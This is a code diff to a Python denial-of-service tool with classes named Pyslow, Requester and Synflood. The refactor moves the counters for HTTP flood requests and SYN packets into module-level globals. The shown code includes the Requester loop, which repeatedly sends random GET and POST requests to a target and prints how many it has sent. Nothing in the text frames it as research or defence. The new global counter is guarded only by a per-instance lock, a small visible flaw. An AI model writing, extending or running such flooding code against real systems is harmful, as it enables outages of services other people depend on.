@@ -200,6 +200,9 @@ class Pyslow:
 		time.sleep(self.sleep)
 
 
+req_count = 0
+
+
 class Requester(Thread):
 	def __init__(self, tgt):
 		Thread.__init__(self)
@@ -208,7 +211,7 @@ class Requester(Thread):
 		self.ssl = False
 		self.req = []
 		self.lock = Lock()
-		self.req_count = 0
+
 		url_type = urllib.parse.urlparse(self.tgt)
 		if url_type.scheme == 'https':
 			self.ssl = True
@@ -250,9 +253,11 @@ class Requester(Thread):
 	def data(self):
 		url = self.create_url()
 		http_header = self.header()
-		return (url, http_header)
+		return url, http_header
 
 	def run(self):
+		global req_count
+
 		try:
 			if self.ssl:
 				conn = http.client.HTTPSConnection(self.tgt, self.port)
@@ -264,8 +269,8 @@ class Requester(Thread):
 				method = choice(['get', 'post'])
 				reqter.request(method.upper(), url, None, http_header)
 				with self.lock:
-					self.req_count += 1
-				print(colored(f"[+] Requester: Sent {self.req_count} HTTP requests", "green"))
+					req_count += 1
+				print(colored(f"[+] Requester: Sent {req_count} HTTP requests", "green"))
 		except KeyboardInterrupt:
 			sys.exit(cprint('[-] Canceled by user', 'red'))
 		except Exception as e:
@@ -281,9 +286,10 @@ class Requester(Thread):
 				pass
 
 
-class Synflood(Thread):
-	sent_syn_packets = 0
+sent_syn_packets = 0
 
+
+class Synflood(Thread):
 	def __init__(self, tgt, ip, sock=None):
 		Thread.__init__(self)
 		self.tgt = tgt
